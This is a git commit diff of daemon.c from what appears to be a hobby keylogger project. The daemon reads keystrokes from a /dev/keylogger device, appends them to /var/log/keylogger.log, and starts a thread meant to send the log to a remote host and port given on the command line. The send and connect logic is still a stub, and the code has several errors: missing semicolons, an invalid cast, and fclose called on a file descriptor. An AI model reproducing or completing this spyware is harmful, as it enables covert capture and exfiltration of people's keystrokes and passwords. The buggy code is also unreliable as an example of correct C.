1fcc83f50f22253081ede39239cc642edf0e206d
Marcin Paszkiewicz <mkpaszkiewicz@gmail.com>
2016-01-17 19:37:59 +0100

    Implemented writing to log file

--- daemon.c
+++ daemon.c
@@ -1,53 +1,118 @@
 #include <stdlib.h>
 #include <stdio.h>
+#include <pthread.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/select.h>
+#include <string.h>
 
-#define BUFSIZE 128
+#ifndef FALLOC_FL_COLLAPSE_RANGE
+#define FALLOC_FL_COLLAPSE_RANGE 0x08
+#endif
 
-char buffer[BUFSIZE];
-int currentSize = 0;
-char* currentPos = buffer;
+#define BUFFER_SIZE 128
 
-int sendToServer(char *host, int port)
+typedef struct address
 {
-    // TODO try to send data to server
+    char *host;
+    int port;
+};
+
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+
+int connect(char *host, int port)
+{
+    /* try to connect to server, if ok return 0 else -1*/
     return -1;
 }
 
-void logToFile()
+void sendToServer(void *args)
 {
-    FILE *file  = fopen("/var/log/keylogger.log", "a+");
-    fwrite(buffer, 1, currentSize, file);
-    currentSize = 0;
-    fclose(file);
+    struct address addr = (struct address) *args;
+    int connected = 0;
+    unsigned char buffer[BUFFER_SIZE];
+
+    printf("Startuje\n");
+    while(1)
+    {
+        if (connected)
+        {
+            /* we are connected to server send log file*/
+            pthread_mutex_lock(&mutex);
+            int fd = open("/var/log/keylogger.log", O_CREAT | O_TRUNC | O_RDWR, 0644);
+            int readBytes = 0;
+            while (readBytes < BUFFER_SIZE)
+            {
+                readBytes += read(fd, buffer + readBytes, BUFFER_SIZE - readBytes)
+            }
+            fclose(fd);
+            pthread_mutex_unlock(&mutex);
+            /* send buffer to server */
+
+            /* if send succeeded delete block of data in log file */
+            pthread_mutex_lock(&mutex);
+            fallocate(fd, FALLOC_FL_COLLAPSE_RANGE, 0, BUFFER_SIZE);
+            pthread_mutex_unlock(&mutex);
+            /* if send does not succeeded leave file as it was and set connected to 0 */
+        }
+        else if (connect(char *host, int port) == 0)
+        {
+            connected = 1;
+        }
+
+        sleep(5)
+    }
 }
 
-int dev_fd;
+void logToFile(unsigned char *buffer, int *currentSize)
+{
+    pthread_mutex_lock(&mutex);
+    FILE *file  = fopen("/var/log/keylogger.log", "a+");
+    int writtenBytes = 0;
+    while (*currentSize - writtenBytes > 0)
+    {
+        writtenBytes += fwrite(buffer + writtenBytes, 1, *currentSize - writtenBytes, file)
+    }
+    *currentSize = 0
+    fclose(file);
+    pthread_mutex_unlock(&mutex);
+}
+
 
 int main(int argc, char *argv[])
 {
     if (argc != 3)
     {
         fprintf(stderr, "Incorrect number of arguments\n");
-        exit(1);
+        return 1;
     }
 
-    char *host = argv[1];
-    int port = atoi(argv[2]);
+    struct address addr;
+    addr.host = argv[1];
+    addr.port = atoi(argv[2]);
 
+    int dev_fd;
     if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
     {
-		perror("open");
-		fprintf(stderr, "Cannot open device\n");
-        exit(2);
+        fprintf(stderr, "Cannot open device\n");
+        return 2;
     }
+
+    unsigned char buffer[BUFFER_SIZE];
+    int currentSize = 0;
+
+    pthread_t sender;
+    if (pthread_create(&sender, NULL, &sendToServer, (void *)&addr) != 0)
+    {
+        fprintf(stderr, "Cannot create thread\n");
+        return 3;
+    }
+
 
     while (1)
     {
         int readBytes;
-        if ((readBytes = read(dev_fd, currentPos, BUFSIZE - currentSize)) == -1)
+        if ((readBytes = read(dev_fd, buffer + currentSize, BUFFER_SIZE - currentSize)) == -1)
         {
             fprintf(stderr, "Error reading device\n");
             close(dev_fd);
@@ -55,9 +120,11 @@ int main(int argc, char *argv[])
         }
 
         currentSize += readBytes;
-
         printf("Read %d bytes\n", readBytes);
 
-        sleep(2);
+        if (currentSize == BUFFER_SIZE)
+         {
+             logToFile(buffer, &currentSize);
+         }
     }
 }
